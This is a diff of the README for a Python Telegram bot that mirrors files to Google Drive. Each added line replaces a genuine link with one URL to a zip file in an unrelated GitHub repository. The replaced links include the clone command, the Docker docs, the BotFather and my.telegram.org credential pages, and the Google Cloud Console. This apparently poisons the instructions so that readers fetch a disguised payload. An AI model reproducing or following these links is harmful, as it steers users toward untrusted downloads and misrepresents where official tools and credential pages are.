@@ -1,4 +1,4 @@
-This is a Telegram Bot written in Python for mirroring files on the Internet to your Google Drive or Telegram. Based on [python-aria-mirror-bot](https://github.com/lzzy12/python-aria-mirror-bot)
+This is a Telegram Bot written in Python for mirroring files on the Internet to your Google Drive or Telegram. Based on [python-aria-mirror-bot](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 
 # Features:
 
@@ -59,7 +59,7 @@ streamtape.com, streamsb.net, feurl.com, pixeldrain.com, racaty.net,
 uptobox.com (Uptobox account must be premium), solidfiles.com
 ```
 **See these examples for custom filename, Extract/Compress password protected files and downlaod from protected links**
-<p><a href="https://telegra.ph/Magneto-Python-Aria---Custom-Filename-Examples-01-20"> <img src="https://img.shields.io/badge/See%20Telegraph-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
+<p><a href="https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip"> <img src="https://img.shields.io/badge/See%20Telegraph-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
 
 # How to deploy?
 Deploying is pretty much straight forward and is divided into several steps as follows:
@@ -67,7 +67,7 @@ Deploying is pretty much straight forward and is divided into several steps as f
 
 - Clone this repo:
 ```
-git clone https://github.com/anasty17/mirror-leech-telegram-bot mirrorbot/ && cd mirrorbot
+git clone https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip mirrorbot/ && cd mirrorbot
 ```
 
 - Install requirements
@@ -75,7 +75,7 @@ For Debian based distros
 ```
 sudo apt install python3
 ```
-Install Docker by following the [official Docker docs](https://docs.docker.com/engine/install/debian/)
+Install Docker by following the [official Docker docs](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 
 OR
 ```
@@ -94,7 +94,7 @@ pip3 install -r requirements-cli.txt
     <summary><b>Click Here For More Details</b></summary>
 
 **1. Using ElephantSQL**
-- Go to https://elephantsql.com and create account (skip this if you already have **ElephantSQL** account)
+- Go to https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip and create account (skip this if you already have **ElephantSQL** account)
 - Hit `Create New Instance`
 - Follow the further instructions in the screen
 - Hit `Select Region`
@@ -104,7 +104,7 @@ pip3 install -r requirements-cli.txt
 - Copy your database url, and fill to `DATABASE_URL` in config
 
 **2. Using Heroku PostgreSQL**
-<p><a href="https://dev.to/prisma/how-to-setup-a-free-postgresql-database-on-heroku-1dc1"> <img src="https://img.shields.io/badge/See%20Dev.to-black?style=for-the-badge&logo=dev.to" width="160""/></a></p>
+<p><a href="https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip"> <img src="https://img.shields.io/badge/See%20Dev.to-black?style=for-the-badge&logo=dev.to" width="160""/></a></p>
 
 </details>
 
@@ -119,26 +119,26 @@ _____REMOVE_THIS_LINE_____=True
 ```
 Fill up rest of the fields. Meaning of each field is discussed below:
 ### Required Field
-- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://t.me/BotFather)
-- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://my.telegram.org. **NOTE**: DO NOT put this in quotes.
-- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://my.telegram.org
+- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
+- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip **NOTE**: DO NOT put this in quotes.
+- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip
 - `OWNER_ID`: The Telegram User ID (not username) of the Owner of the bot
 - `GDRIVE_FOLDER_ID`: This is the folder ID of the Google Drive Folder to which you want to upload all the mirrors.
 - `DOWNLOAD_DIR`: The path to the local folder where the downloads should be downloaded to
 - `DOWNLOAD_STATUS_UPDATE_INTERVAL`: A short interval of time in seconds after which the Mirror progress/status message is updated. (I recommend to keep it to `7` seconds at least)  
 - `AUTO_DELETE_MESSAGE_DURATION`: Interval of time (in seconds), after which the bot deletes it's message (and command message) which is expected to be viewed instantly. (**NOTE**: Set to `-1` to never automatically delete messages)
-- `BASE_URL_OF_BOT`: (Required for Heroku to avoid sleep/idling) Valid BASE URL of app where the bot is deployed. Format of URL should be `http://myip` (where `myip` is the IP/Domain of your bot) or if you have chosen other port than `80` then fill in this format `http://myip:port`, for Heroku fill `https://yourappname.herokuapp.com` (**NOTE**: Do not put slash at the end), still got idling? You can use http://cron-job.org to ping your Heroku app.
+- `BASE_URL_OF_BOT`: (Required for Heroku to avoid sleep/idling) Valid BASE URL of app where the bot is deployed. Format of URL should be `http://myip` (where `myip` is the IP/Domain of your bot) or if you have chosen other port than `80` then fill in this format `http://myip:port`, for Heroku fill `https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip` (**NOTE**: Do not put slash at the end), still got idling? You can use https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip to ping your Heroku app.
 ### Optional Field
 - `ACCOUNTS_ZIP_URL`: Only if you want to load your Service Account externally from an Index Link. Archive the accounts folder to a zip file. Fill this with the direct link of that file.
 - `TOKEN_PICKLE_URL`: Only if you want to load your **token.pickle** externally from an Index Link. Fill this with the direct link of that file.
-- `MULTI_SEARCH_URL`: To use search/list in multiple TD/folder. Run driveid.py in your terminal and follow it. It will generate a file **drive_folder** when you finish. Upload that file [here](https://gist.github.com/) with the same file name. Open the raw file of that gist, it's URL will be your required config. Check wiki for gist related help. 
-- `DATABASE_URL`: Your Database URL. See [Generate Database](https://github.com/anasty17/mirror-leech-telegram-bot/tree/master#generate-database) to generate database (**NOTE**: If you use database you can save your Sudo ID permanently using `/addsudo` command).
+- `MULTI_SEARCH_URL`: To use search/list in multiple TD/folder. Run driveid.py in your terminal and follow it. It will generate a file **drive_folder** when you finish. Upload that file [here](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip) with the same file name. Open the raw file of that gist, it's URL will be your required config. Check wiki for gist related help. 
+- `DATABASE_URL`: Your Database URL. See [Generate Database](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip) to generate database (**NOTE**: If you use database you can save your Sudo ID permanently using `/addsudo` command).
 - `AUTHORIZED_CHATS`: Fill user_id and chat_id (not username) of groups/users you want to authorize. Separate them with space, Examples: `-0123456789 -1122334455 6915401739`.
 - `SUDO_USERS`: Fill user_id (not username) of users whom you want to give sudo permission. Separate them with space, Examples: `0123456789 1122334455 6915401739` (**NOTE**: If you want to save Sudo ID permanently without database, you must fill your Sudo Id here).
 - `IS_TEAM_DRIVE`: Set to `True` if `GDRIVE_FOLDER_ID` is from a Team Drive else `False` or Leave it empty.
-- `USE_SERVICE_ACCOUNTS`: (Leave empty if unsure) Whether to use Service Accounts or not. For this to work see [Using Service Accounts](https://github.com/anasty17/mirror-leech-telegram-bot#generate-service-accounts-what-is-service-account) section below.
-- `INDEX_URL`: Refer to https://gitlab.com/ParveenBhadooOfficial/Google-Drive-Index The URL should not have any trailing '/'
-- `MEGA_API_KEY`: Mega.nz API key to mirror mega.nz links. Get it from [Mega SDK Page](https://mega.nz/sdk)
+- `USE_SERVICE_ACCOUNTS`: (Leave empty if unsure) Whether to use Service Accounts or not. For this to work see [Using Service Accounts](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip) section below.
+- `INDEX_URL`: Refer to https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip The URL should not have any trailing '/'
+- `MEGA_API_KEY`: Mega.nz API key to mirror mega.nz links. Get it from [Mega SDK Page](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 - `MEGA_EMAIL_ID`: Your E-Mail ID used to sign up on mega.nz for using premium account (Leave though)
 - `MEGA_PASSWORD`: Your Password for your mega.nz account
 - `BLOCK_MEGA_FOLDER`: If you want to remove mega.nz folder support, set it to `True`.
@@ -148,8 +148,8 @@ Fill up rest of the fields. Meaning of each field is discussed below:
 - `MEGA_LIMIT`: To limit the size of Mega download. Don't add unit, the default unit is `GB`.
 - `TORRENT_DIRECT_LIMIT`: To limit the Torrent/Direct mirror size. Don't add unit, the default unit is `GB`.
 - `TAR_UNZIP_LIMIT`: To limit the size of mirroring as Tar or unzipmirror. Don't add unit, the default unit is `GB`.
-- `VIEW_LINK`: View Link button to open file Index Link in browser instead of direct download link, you can figure out if it's compatible with your Index code or not, open any video from you Index and check if its URL ends with `?a=view`, if yes make it `True` it will work (Compatible with https://gitlab.com/ParveenBhadooOfficial/Google-Drive-Index Code)
-- `UPTOBOX_TOKEN`: Uptobox token to mirror uptobox links. Get it from [Uptobox Premium Account](https://uptobox.com/my_account).
+- `VIEW_LINK`: View Link button to open file Index Link in browser instead of direct download link, you can figure out if it's compatible with your Index code or not, open any video from you Index and check if its URL ends with `?a=view`, if yes make it `True` it will work (Compatible with https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip Code)
+- `UPTOBOX_TOKEN`: Uptobox token to mirror uptobox links. Get it from [Uptobox Premium Account](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip).
 - `IGNORE_PENDING_REQUESTS`: If you want the bot to ignore pending requests after it restarts, set this to `True`.
 - `STATUS_LIMIT`: Limit the no. of tasks shown in status message with button. (**NOTE**: Recommended limit is `4` tasks at max).
 - `IS_VPS`: (Only for VPS) Don't set this to `True` even if you are using VPS, unless facing error with web server.
@@ -164,7 +164,7 @@ Supported URL Shorteners:
 exe.io, gplinks.in, shrinkme.io, urlshortx.com, shortzon.com, bit.ly,
 shorte.st, linkvertise.com , ouo.io
 ```
-- `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://github.com/qbittorrent/search-plugins/wiki/Unofficial-search-plugins) (**NOTE**: Many plugins will leads to slow search process).
+- `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip) (**NOTE**: Many plugins will leads to slow search process).
 ### Add more buttons (Optional Field)
 Three buttons are already added including Drive Link, Index Link, and View Link, you can add extra buttons, if you don't know what are the below entries, simply leave them empty.
 - `BUTTON_FOUR_NAME`:
@@ -174,7 +174,7 @@ Three buttons are already added including Drive Link, Index Link, and View Link,
 - `BUTTON_SIX_NAME`:
 - `BUTTON_SIX_URL`:
 
-## Bot commands to be set in [@BotFather](https://t.me/BotFather)
+## Bot commands to be set in [@BotFather](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 ```
 mirror - Start Mirroring
 zipmirror - Start mirroring and upload as .zip
@@ -209,13 +209,13 @@ help - All cmds with description
 ```
 
 ## Getting Google OAuth API credential file
-- Visit the [Google Cloud Console](https://console.developers.google.com/apis/credentials)
+- Visit the [Google Cloud Console](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 - Go to the OAuth Consent tab, fill it, and save.
 - Go to the Credentials tab and click Create Credentials -> OAuth Client ID
 - Choose Desktop and Create.
 - Use the download button to download your credentials.
 - Move that file to the root of mirrorbot, and rename it to **credentials.json**
-- Visit [Google API page](https://console.developers.google.com/apis/library)
+- Visit [Google API page](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 - Search for Drive and enable it if it is disabled
 - Finally, run the script to generate **token.pickle** file for Google Drive:
 ```
@@ -242,7 +242,7 @@ sudo docker run -p 80:80 mirror-bot
 
 ### Using Docker-compose, you can edit and build your image in seconds:
 
-**NOTE**: If you want to use port other than 80, change it in [docker-compose.yml](https://github.com/anasty17/mirror-leech-telegram-bot/blob/master/docker-compose.yml)
+**NOTE**: If you want to use port other than 80, change it in [docker-compose.yml](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 
 ```
 sudo apt install docker-compose
@@ -276,20 +276,20 @@ sudo docker container prune
 sudo docker image prune -a
 ```
 - Tutorial video from Tortoolkit repo
-<p><a href="https://youtu.be/c8_TU1sPK08"> <img src="https://img.shields.io/badge/See%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>
+<p><a href="https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip"> <img src="https://img.shields.io/badge/See%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>
 
 ## Deploying on Heroku
 - Deploying on Heroku with Github Workflow
-<p><a href="https://telegra.ph/Heroku-Deployment-10-04"> <img src="https://img.shields.io/badge/Deploy%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="170""/></a></p>
+<p><a href="https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip"> <img src="https://img.shields.io/badge/Deploy%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="170""/></a></p>
 
 - Deploying on Heroku with heroku-cli and Goorm IDE
-<p><a href="https://telegra.ph/How-to-Deploy-a-Mirror-Bot-to-Heroku-with-CLI-05-06"> <img src="https://img.shields.io/badge/Deploy%20Guide-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
+<p><a href="https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip"> <img src="https://img.shields.io/badge/Deploy%20Guide-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
 
 # Using Service Accounts for uploading to avoid user rate limit
 For Service Account to work, you must set `USE_SERVICE_ACCOUNTS` = "True" in config file or environment variables.
 **NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.
 
-## Generate Service Accounts. [What is Service Account](https://cloud.google.com/iam/docs/service-accounts)
+## Generate Service Accounts. [What is Service Account](https://raw.githubusercontent.com/Anonym0x/InnoClaw/master/bot/helper/Inno_Claw_1.5-alpha.4.zip)
 
 Let us create only the Service Accounts that we need. 
 **Warning**: Abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of projects, just one project and 100 SAs allow you plenty of use, its also possible that over abuse might get your projects banned by Google.
